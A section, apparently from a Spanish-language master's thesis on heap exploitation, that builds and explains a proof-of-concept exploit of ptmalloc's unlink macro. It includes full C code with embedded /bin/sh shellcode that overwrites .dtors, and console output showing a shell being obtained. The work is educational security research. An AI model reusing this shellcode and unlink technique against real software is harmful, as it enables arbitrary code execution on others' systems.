\subsubsection{Construcción de la prueba de concepto}
\label{sec:const_pof}

Ahora que parece que el \textit{payload} parece funcional siempre y cuando sólo se ejecute el primer |free()|\footnote{Las consecuencias del segundo free() con el payload actual aun no han sido estudiadas.}, el Código \ref{code:ptmalloc_exploit_1} muestra una prueba de concepto con todos los aspectos detallados en los apartados anteriores. \bigskip

\lstset{language=C, caption=Exploit para el algoritmo ptmalloc , label=code:ptmalloc_exploit_1}
\begin{lstlisting}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAYLOAD_SIZE	531

void world_destruction() __attribute__((destructor));
void build_payload (char *, void *);

char shellcode[]= 	/* jmp 12 + 12 nops */
			"\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
			/* shellcode by vlan7 and sch3m4 */
			"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9"
			"\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
			"\x69\x8d\x41\x0b\x89\xe3\xcd\x80";

int main(int argc, char ** argv) {
	
	int status;
	char crafted_data[700] = {0};
	
	
	/* Obtain the page size of the system */
	int pagesize = sysconf(_SC_PAGE_SIZE);
	if ( pagesize == -1) {
		perror("[-] Page size could not be obtained");
		exit(EXIT_FAILURE);
	}
	/* Obtain an aligned memory region in order to mprotect it */
	void * real_shell;
	if ( posix_memalign(&real_shell, pagesize, sizeof(shellcode)) ) {
		perror("[+] Aligned memory could not be obtained");
		exit(EXIT_FAILURE);
	}
	/* Copy the shellcode to the executable region obtained with memalign */
	memcpy(real_shell, shellcode, sizeof(shellcode));
	/* Making  shellcode location executable */
	mprotect(real_shell, pagesize, PROT_WRITE | PROT_EXEC);
	/* Making DTORS section writable */
	mprotect((void*)0x8049000, pagesize, PROT_WRITE);
	/* The payload is built */
	build_payload(crafted_data, real_shell);

	
	char * ptr_1 = (char *) malloc (512);
	char * ptr_2 = (char *) malloc (512);

	memcpy(ptr_1, crafted_data, PAYLOAD_SIZE);

	free(ptr_1);
	//free(ptr_2);	
	
	return 0;
}

void build_payload(char * crafted_data, void * sc_addr) {

	char str_dtor_ptr[5] = {0};
	char * seek = crafted_data;
	
	/* Trash */
	memset(seek, 'A', 516); 
	seek += 516;
	/* size of second freed chunk. 0 value */
	memcpy(seek, "\x00\x00\x00\x00", 4);
	seek += 4;
	/* fd of second freed chunk. dtors_end - 12 */
	memcpy(str_dtor_ptr, "\x10\x9f\x04\x08", 4);
	memcpy(seek, str_dtor_ptr, 4);
	seek += 4;
	/* bk of second freed chunk. Shellcode address */	
	memcpy(seek, &sc_addr, 4);
	seek += 4;
}

void world_destruction() {}
\end{lstlisting}

El código fuente está formado por tres funciones. La primera es el |main()|, que es la función principal. La función |world_destruction()| es el destructor necesario para que el \textit{shellcode} se ejecute una vez se sobrescriba la sección .dtors, tal y como se ha detallado en el Apéndice \ref{ap:II}. Por último, la función |build_payload()| es la encargada de construir el \textit{payload} que se ha definido en el apartado anterior. \bigskip

El código de la función |main()| ya se ha comentado por separado en otros apartados. Así que no tiene sentido hacer hincapié. \\
Por otro lado, en la función |build_payload()| se puede ver como se contruye el \textit{payload} especificado anteriormente. Un dato a destacar es que todos los datos que se sobrescriben y que no son el campo |size|, |fd| o |bk| del segundo fragmento son irrelevantes. Por esta razón, en la línea 64 se escriben 516 bytes de basura. Estos bytes llenarán el búfer |ptr_1| y sobrescribirá el campo |prev_size| del segundo fragmento. En la línea 67 se escribe un 0 el campo |size| del segundo fragmento, en la línea 71 se escribe la dirección de la sección .dtors + 4 - 12\footnote{Destacar que los datos se deben escribir en little endian debido a la arquitectura sobre la que se trabaja} en el campo |fd| del segundo fragmento y en la línea 74 se escribe la dirección del \textit{shellcode} en el campo |bk|. \bigskip

Aun quedan por destacar tres detalles más. \\
El primero es que en la línea 53 el segundo |free()| está comentado debido a que no se han estudiado cuales son sus repercusiones. Hasta el momento, sólo se ha analizado la ejecución del primer |free()| asegurando que si la macro \textit{unlink} se ejecuta y los punteros |bk| y |fd| contienen los datos explicados, se conseguirá la ejecución de código arbitrario.\\
El segundo detalle es que el \textit{shellcode} tiene una particularidad especial. Tal y como se comentó en el capítulo \ref{ref:shellcode_overwrite} en la página \pageref{ref:shellcode_overwrite}, la cuarta operación de la macro \textit{unlink} acabará sobrescribiendo el octavo byte del \textit{shellcode} con el contenido de |fd|. Así que para que no se sobrescriba el \textit{shellcode}, la primera operación del mismo, línea 13, será un |jmp 12| seguida de 10 bytes de basura, o sea, un total de 12 bytes. De este modo, el flujo de ejecución del \textit{shellcode} se saltará los bytes sobrescritos por la última instrucción de la macro \textit{unlink} y ejecutará el \textit{shellcode} de manera correcta.\\
Por último, y este detalle se debe tener muy en cuenta, el código vulnerable ha sido modificado de tal manera que los datos a copiar en la línea 50 por la función |memcpy| ya no vienen dados por la función |strlen()| sino que vienen dados por un valor fijo definido como |PAYLOAD_SIZE|. Esto es muy importante ya que la función |strlen()| deja de contar bytes cuando se encuentra con un byte nulo. En el \textit{payload} que se ha detallado, la función |strlen()| dejaría de contar bytes antes de sobrescribir el campo |size| del segundo fragmento ya que en el mismo campo |size| se estarían copiando varios bytes nulos. \bigskip

A continuación se muestra lo que ocurre al compilar y ejecutar el Código \ref{code:ptmalloc_exploit_1}.\bigskip

\begin{listing}[style=consola, caption=Ejecución de la prueba de concepto con un solo free(), label=out:pof_1]
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ gcc pof.c -o pof -g
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ ./pof 
$ id
uid=1000(newlog) gid=1000(newlog) groups=1000(newlog),4(adm),20(dialout),24(cdrom),46(plugdev),111(lpadmin),119(admin),122(sambashare)
$ exit
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ 
\end{listing}

Tal y como se puede ver, se ejecuta el \textit{shellcode} lo que brinda al usuario una línea de comandos para ejecutar lo que desee. \bigskip

Finalmente, lo único que queda por dilucidar es si descomentando el seguno |free()| el \textit{shellcode} sigue ejecutándose. El Código \ref{out:pof_2} muestra el cambio a realizar y la ejecución de la nueva prueba de concepto. \bigskip

\begin{listing}[style=consola, caption=Ejecución de la prueba de concepto con los dos free(), label=out:pof_2]
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ sed 's/\/\/free/free/gi' pof.c >> pof2.c
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ gcc pof2.c -o pof2
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ ./pof2 
$ id
uid=1000(newlog) gid=1000(newlog) groups=1000(newlog),4(adm),20(dialout),24(cdrom),46(plugdev),111(lpadmin),119(admin),122(sambashare)
$ exit
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ 
\end{listing}

Con ''|sed 's/\/\/free/free/gi' pof.c >> pof2.c|'' se crea el archivo pof2.c que será igual al archivo pof.c pero la línea con el free() comentado se descomentará. A continuación se compila y ejecuta obteniendo el mismo resultado que en la prueba de concepto anterior. \bigskip

Lo que ocurre cuando se ejecuta el segundo |free()| es que el flujo de ejecución entra en la condición de la línea 4217 del archivo malloc.c. Con dicha condición el algoritmo descubre si el fragmento a liberar cumple las condiciones para almacenarse en un \textit{fastbin}. Debido a que el tamaño del fragmento a liberar es 0 al haber sobrescrito el campo |size|, el fragmento cumple las condiciones y por tanto se almacena como si fuera un \textit{fastbin}. \\
Así pues, si el flujo de ejecución sigue el camino de los \textit{fastbins}, no se encuentra ningún problema y la prueba de concepto funciona correctamente.